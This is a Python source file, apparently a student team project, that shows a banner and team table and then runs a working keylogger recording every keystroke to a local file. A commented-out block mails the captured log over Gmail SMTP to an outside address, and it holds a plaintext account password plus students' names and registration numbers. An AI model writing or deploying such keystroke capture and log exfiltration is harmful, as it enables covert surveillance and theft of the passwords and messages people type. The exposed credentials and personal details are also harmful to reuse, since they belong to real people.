from pynput import keyboard
import colored
import fontstyle
import time
from rich.progress import Progress
from rich.console import Console
from rich.table import Table

bannar_color =[
colored.fg("magenta") + colored.attr("bold"), 
colored.fg("orchid")  + colored.attr("bold"),
colored.fg("cyan")    + colored.attr("bold"),
colored.fg("yellow")  + colored.attr("bold"),
colored.fg("#bc000b") + colored.attr("bold"),
colored.fg("white")   + colored.attr("bold"),
colored.fg("green")   + colored.attr("bold"),
colored.fg("#aa557f") + colored.attr("bold"),
colored.fg("#33ff29") + colored.attr("bold"),
colored.fg("plum_3")  + colored.attr("bold"),
colored.fg("#ff1d00") + colored.attr("bold"),
colored.fg("#ab01ff") + colored.attr("bold"),
colored.fg("#c81d59") + colored.attr("bold"),
colored.fg("blue")    + colored.attr("bold"),
colored.fg("#c81d59") + colored.bg("cyan")+colored.attr("bold"),
]
#==turquoise_2=============#ff013c=================================

W = bannar_color[3] #yellow
Y = bannar_color[0] #magenta
B = bannar_color[2] #cyan
G = bannar_color[6] #green
R = bannar_color[4] #red
M = bannar_color[7] ##aa557f
X = bannar_color[8] ##33ff29
Z = bannar_color[9] ##ff1d00
Q = bannar_color[10]##ab01ff
GG = bannar_color[11]##c81d59
WI = bannar_color[5]#white
BOOLD = bannar_color[12]
bl = bannar_color[-2]
F = bannar_color[-1]
res = colored.style.RESET


banner =f"""
	    {Q}SEPM_PROJ__{GG}                                           ██╗      ██████╗  ██████╗ ███████╗██████╗ 
	  {Q}KEY_logger_dev.{GG}                                         ██║     ██╔═══██╗██╔════╝ ██╔════╝██╔══██╗
	 {Q}KEYY_logger_de3vil:{bl}...........................{GG}           ██║     ██║   ██║██║  ███╗█████╗  ██████╔╝
	{Q}KEY:        :keylogger#:{X}SOFTWARE__BASED__KEYLOGGER__ {GG}     ██║     ██║   ██║██║   ██║██╔══╝  ██╔══██╗
	{Q}KEY:         :keylogge#:{X}------------------------------{GG}    ███████╗╚██████╔╝╚██████╔╝███████╗██║  ██║
	{Q}KEY:        :keyloggeY#:{X}SANTHOSH_RAHUL_ARZOB_      {GG}       ╚══════╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
	{Q}KEY_LOGGER_DEVS#:{bl}...........................              
	 {Q}KEY_LOGGER_DEV{Q}
	    {Q}PYTHONDEV{Q}																											

{WI}"""
print(banner)


with Progress() as progress:
    task1 = progress.add_task("[red]Loading...", total=1000)
    while not progress.finished:
        progress.update(task1, advance=3)
        time.sleep(0.02)



table = Table(title="THE TEAM")

table.add_column("Registration number", justify="right", style="cyan", no_wrap=True)
table.add_column("Name", style="magenta")
table.add_column("Role", justify="right", style="green")

table.add_row("RA2111003010290", "Rahul S", "Project Manager")
table.add_row("RA2111003010302", "Santhosh P", "Tech Lead")
table.add_row("RA2111003010303", "Arzob Sen", "Test Lead")
console = Console()
console.print(table)
 
# format text
text = fontstyle.apply('KEYSTROKES HAVE STARTED RECORDING', 'bold/Italic/orange/BLUE_BG')
 
# display text
print(text)
text = fontstyle.apply('THE RECORDED KEYSTROKES ARE: ', 'bold/Italic/red/BLUE_BG')
print(text)



class KeyLogger():
    def __init__(self, filename: str = "keylogs.txt") -> None:
        self.filename = filename

    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            return str(key)

    def on_press(self, key):
        print(key)
        with open(self.filename, 'a') as logs:
            logs.write(self.get_char(key))

    def main(self):
        listener = keyboard.Listener(
            on_press=self.on_press,
        )
        listener.start()


if __name__ == '__main__':
    logger = KeyLogger()
    logger.main()
    input()
'''
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

# Define the email address and password for the sender's email account
email_address ='serjioraj@gmail.com'
email_password ='Software@7'

# Define the email addresses for the sender and recipient
sender_email = 'serjioraj@gmail.com'
recipient_email = 'sp4276@srmist.edu.in'

# Define the input file path
input_file = 'keylogs.txt'

# Define the email subject and body
email_subject = 'Sample email with attachment'
email_body = 'Please find the attached file.'

# Create a message object and set the email subject, body, sender, and recipient
message = MIMEMultipart()
message['Subject'] = email_subject
message['From'] = sender_email
message['To'] = recipient_email

# Attach the input file to the message as an attachment
with open(input_file, 'rb') as file:
    attach_file = MIMEApplication(file.read(), _subtype='txt')
    attach_file.add_header('Content-Disposition', 'attachment', filename=os.path.basename(input_file))
    message.attach(attach_file)

# Add the email body to the message
message.attach(MIMEText(email_body, 'plain'))

# Create an SMTP server object and connect to the server
smtp_server = smtplib.SMTP('smtp.gmail.com', 587)
smtp_server.starttls()

# Login to the sender's email account
smtp_server.login('email_address', 'email_password')

# Send the message to the recipient
smtp_server.sendmail(sender_email, recipient_email, message.as_string())

# Disconnect from the server
smtp_server.quit()
'''
